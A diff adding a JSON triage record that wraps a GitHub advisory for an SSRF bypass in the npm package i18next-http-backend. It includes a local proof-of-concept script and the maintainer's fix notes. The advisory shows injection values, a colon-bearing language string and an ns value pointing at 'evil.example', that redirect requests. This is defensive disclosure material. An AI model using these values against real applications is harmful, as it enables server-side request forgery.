@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/322990224?v=4\", \"events_url\": \"https://api.github.com/users/avrlab233/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/avrlab233/followers\", \"following_url\": \"https://api.github.com/users/avrlab233/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/avrlab233/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/avrlab233\", \"id\": 322990224, \"login\": \"avrlab233\", \"node_id\": \"U_kgDOE0BwkA\", \"organizations_url\": \"https://api.github.com/users/avrlab233/orgs\", \"received_events_url\": \"https://api.github.com/users/avrlab233/received_events\", \"repos_url\": \"https://api.github.com/users/avrlab233/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/avrlab233/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/avrlab233/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/avrlab233\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-105800\", \"cvss\": {\"score\": 3.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 3.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-74\", \"name\": \"Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\"}, {\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"There is an SSRF vulnerability when using `i18next-http-backend`. A colon in an attacker-controlled language value can make a custom path template request an unintended origin.\\n\\nThis is reachable under the following conditions: Attacker controls i18next language or namespace input that is interpolated into loadPath.\\n\\n## Proof of Concept\\n\\n```js\\n// SSRF through a colon-only URL scheme in i18next-http-backend interpolation.\\nconst http = require(\\\"node:http\\\");\\nconst Backend = require(\\\"i18next-http-backend\\\");\\n\\nfunction read(backend, lng, ns) {\\n  return new Promise((resolve) => {\\n    backend.read(lng, ns, (err) => resolve(err));\\n  });\\n}\\n\\nasync function main() {\\n  let gotRequest = false;\\n  const server = http.createServer((req, res) => {\\n    gotRequest = req.url === \\\"/common.json\\\";\\n    res.writeHead(200, { \\\"content-type\\\": \\\"application/json\\\" });\\n    res.end(\\\"{}\\\");\\n  });\\n\\n  await new Promise((resolve) => server.listen(0, \\\"127.0.0.1\\\", resolve));\\n  const backend = new Backend(null, { loadPath: \\\"{{lng}}/{{ns}}.json\\\" });\\n  const lng = `http:127.0.0.1:${server.address().port}`;\\n\\n  const err = await read(backend, lng, \\\"common\\\");\\n  server.close();\\n\\n  const vulnerable = gotRequest && !err;\\n  console.log(vulnerable ? \\\"VULNERABLE\\\" : \\\"SAFE\\\");\\n  if (!vulnerable) process.exitCode = 1;\\n}\\n\\nmain();\\n```\\n\\nRun:\\n\\n```bash\\nnpm install --ignore-scripts\\nnode poc.js\\n```\\n\\nThe expected result is:\\n\\n```text\\nVULNERABLE\\n```\\n\\n## Why the Previous Patch Was Incomplete\\n\\nThis vulnerability is caused by an incomplete patch for [CVE-2026-41691](https://github.com/advisories/GHSA-q89c-q3h5-w34g). The previous patch addressed the following behavior: Original hardening blocks path traversal and selected URL-control characters in lng/ns.\\n\\nThe following bypass remains in the current release: lng=http:127.0.0.1:<port> with loadPath={{lng}}/{{ns}}.json; colon is not blocked and produces an outbound request.\\n\\n## Impact\\n\\nThe attacker-controlled language or namespace value can redirect the backend request to an unintended origin, resulting in URL injection and possible SSRF.\\n\\n## Recommended Fix\\n\\nParse the final URL and require it to remain within the intended origin and path. If absolute URLs are supported, validate them against an explicit allowlist.\\n\\nPlease let us know if you need any additional information or clarification. We are happy to prepare a pull request if that would be helpful. Thank you for reviewing this report.\\n\\n## Maintainer note\\n\\nConfirmed and fixed in 4.0.2 (commit i18next/i18next-http-backend@07e0288).\\n\\n**Preconditions.** The bypass only works when the `loadPath` / `addPath` template *begins* directly with `{{lng}}` or `{{ns}}` — no origin and no leading `/`, e.g. `{{lng}}/{{ns}}.json`. Only in that position is `http:` parsed as a URL scheme. The default `/locales/{{lng}}/{{ns}}.json` and every template with a leading path or origin are **not** affected: a colon inside a path segment has no structural meaning there, and the resulting string is rejected as an invalid URL. The same template shape also allowed an `ns` value such as `//evil.example/x` to become a protocol-relative URL in browsers.\\n\\n**Fix.** `:` is now rejected in both `lng` and `ns` values, and `//` in `ns` values. No BCP-47 language code contains a colon, and `:` is i18next's default namespace separator, so no usable namespace name does either.\\n\\n**Affected range.** Versions before 3.0.5 had no validation at all and are reachable through this vector too, so the affected range is `< 4.0.2` rather than `>= 3.0.5, <= 4.0.1`.\", \"ghsa_id\": \"GHSA-xvq9-wjp8-hwqf\", \"github_reviewed_at\": \"2026-10-06T15:33:33Z\", \"html_url\": \"https://github.com/advisories/GHSA-xvq9-wjp8-hwqf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xvq9-wjp8-hwqf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-105800\"}], \"nvd_published_at\": \"2026-10-06T15:17:17Z\", \"published_at\": \"2026-10-06T15:33:33Z\", \"references\": [\"https://github.com/i18next/i18next-http-backend/security/advisories/GHSA-xvq9-wjp8-hwqf\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-105800\", \"https://github.com/i18next/i18next-http-backend/commit/07e028862b25d0b9251bf3cafb92be2d35285f85\", \"https://github.com/i18next/i18next-http-backend/releases/tag/v4.0.2\", \"https://github.com/advisories/GHSA-xvq9-wjp8-hwqf\"], \"repository_advisory_url\": \"https://api.github.com/repos/i18next/i18next-http-backend/security-advisories/GHSA-xvq9-wjp8-hwqf\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/i18next/i18next-http-backend\", \"summary\": \"i18next-http-backend incomplete URL validation permits SSRF\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-06T15:33:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-xvq9-wjp8-hwqf\", \"vulnerabilities\": [{\"first_patched_version\": \"4.0.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"i18next-http-backend\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.0.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xvq9-wjp8-hwqf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "i18next-http-backend: < 4.0.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-105800",
+      "CVE-2026-41691"
+    ],
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "i18next-http-backend"
+    ],
+    "remote": true,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-10-06T19:13:48.645947Z",
+  "provenance": {
+    "content_sha256": "ef3b579ca54940bf261eb2727d87c13d1f56471b1862378a4e1e28cdb81f0b65",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-06T15:33:33Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xvq9-wjp8-hwqf",
+  "status": "active",
+  "title": "i18next-http-backend incomplete URL validation permits SSRF",
+  "updated_at": "2026-10-06T15:33:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xvq9-wjp8-hwqf"
+}
